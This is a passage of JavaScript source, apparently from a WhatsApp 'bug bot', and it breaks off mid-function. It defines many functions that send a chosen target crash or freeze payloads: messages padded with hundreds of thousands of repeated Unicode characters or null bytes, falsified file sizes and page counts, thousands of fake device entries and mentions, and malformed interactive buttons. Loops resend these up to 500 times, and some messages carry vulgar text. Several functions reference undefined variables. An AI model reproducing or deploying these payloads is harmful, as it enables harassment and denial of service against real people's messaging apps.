                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGRapcGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGRapbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuRapa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGRapcGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGRapbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuRapa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/xyroooy",
                mediaUrl: "https://t.me/xyroooy",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/xyroooy",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    //

    async function XiosVirus(target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 150; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }
    
    async function baom(target) {
      for (let i = 0; i < 65; i++) {
        await DocFc(target)
        await DocFc2(target)
        await livelocnew(target)
        await DocFc(target)
        await DocFc2(target)
        await livelocnew(target)
        await DocFc(target)
        await DocFc2(target)
        await livelocnew(target)
      }
      console.log(
        chalk.red.bold(
          `zaxyzpBugs`
        )
      );
    }
    
    // [ BUG FUNCTION ]
    
 async function CrlButton(target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/k5c6co.jpg" } }, 
                                            { upload: sock.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `你怎麼知道某件事是有趣的為什麼是錯的` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "你怎麼知道某件事是有趣的為什麼是錯的",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@stokzaxyz\",\"merchant_url\":\"https://www.youtube.com/@stokzaxyz\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: Zets }
    );
    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}


async function NewIos(target) {
sock.relayMessage(
    jid,
    {
        extendedTextMessage: {
            text: `𑲭𑲭你怎麼知道某件事是有趣的為什麼是錯的 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    sock
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}

async function CallGc(target) {
await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " zaxyz 𝗩1 𝗚𝗘𝗡 1👀 " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'youtube.com/@stokzaxyz',
                    }
                }
            }
        }, {});
      }
      
      

async function improveforce(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "zaxyz 𝗩1 𝗚𝗘𝗡 1",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function CrashCnc(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "◈", 
                        },
                                    nativeFlowMessage: {
                                      buttons: [
                              {
                              name: "single_select",
                       buttonParamsJson: "",
                           },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                                }
                            ],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}

async function LoadCrash(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 9999999, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    fileName: "𝑿͢𝑹𝒑𝒊𝒑̶͢͠𝒑𝑴̾𝒐𝒅̈́𝒔̗𝒔🌹",
                                    fileLength: "9999999999999", 
                                    pageCount: 9007199254740991, 
                                    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc",
                                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                    mediaKeyTimestamp: "1715880173",
                                    mediaType: "presentation",
                                    contactVcard: true,
                                    jpegThumbnail: Buffer.alloc(4096, 0) 
                                }
                            }
                        },
                        body: {
                            text: "𝑿͢𝑹𝒑𝒊𝒑̶͢͠𝒑𝑴̾𝒐𝒅̈́𝒔̗𝒔🌹",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}

async function ImproveCrash(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "zaxyz🌹",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "⏤͟zaxyz🌹" },
                            { name: "mpm", buttonParamsJson: "zaxyz🌹" },
                            { name: "mpm", buttonParamsJson: "zaxyz🌹" },
                            { name: "mpm", buttonParamsJson: "zaxyz🌹" },
                        ],
                    },
                },
            },
        },
    };

    for (let i = 0; i < 500; i++) {
        await sock.relayMessage(target, Msg, { participant: { jid: target } });
    }
}

async function CrashCalls(target) {
var CallPermission = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo: {
mentionedJid: [m.chat],
isForwarded: true,
forwardingScore: 999
},
body: {
text: "! zaxyz🌹" + "軎�".repeat(99999),
footer: "zaxyz🌹"
},
nativeFlowMessage: {
buttons: [
{ 
name: "single_select", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "mpm", 
buttonParamsJson: "" 
}
]
}
}
}
}
};
await sock.relayMessage(target, CallPermission, { participant: { jid: target } });
}

async function uibuglogger(target) {
     let sections = [];
     
     let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };
    await sock.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'c',
                        degreesLongitude: 'c',
                        caption: '/ zaxyz🌹?' + "軎筷Ω".repeat(550000) + "@1".repeat(90000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "call_permission_request",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "mpm",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "zaxyz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(900000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
  contextInfo: {
      forwardingScore: 127,
            isForwarded: true,
                    quotedMessage: {
                             documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "zaxyz🌹",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
                    contactVcard: true
                        },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: "zaxyz🌹└"
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
    await console.clear()
    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Bug WhatsApp Ui System`);
}
async function FlowXX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "zaxyz🌹",
              hasMediaAttachment: false,
            },
            body: {
              text: "zaxyz🌹",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function StravaX(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u2000".repeat(99000000);
        let deepNested = {
          title: "\u2000".repeat(99000000),
          highlight_label: "\u2000".repeat(99000000),
          rows: [
            {
              title: largeText,
              id: "\u2000".repeat(99000000),
              subrows: [
                {
                  title: "\u2000".repeat(99000000),
                  id: "\u2000".repeat(90000000),
                  subsubrows: [
                    {
                      title: "\u2000".repeat(99000000),
                      id: "\u2000".repeat(99000000),
                    },
                    {
                      title: "\u2000".repeat(99000000),
                      id: "\u2000".repeat(99000000),
                    },
                  ],
                },
                {
                  title: "\u2000".repeat(99000000),
                  id: "\u2000".repeat(99000000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u2000".repeat(99000000),
        sections: sections,
      };
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
            },
            body: {
              text: "zaxyz🌹" + "ꦾ".repeat(99777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "send_location",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
  
  async function AntiSpiral(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "zaxyz🌹",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("GEN1 UI🐉"));
        }
  
		
		async function CrashUi(target, babi2, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
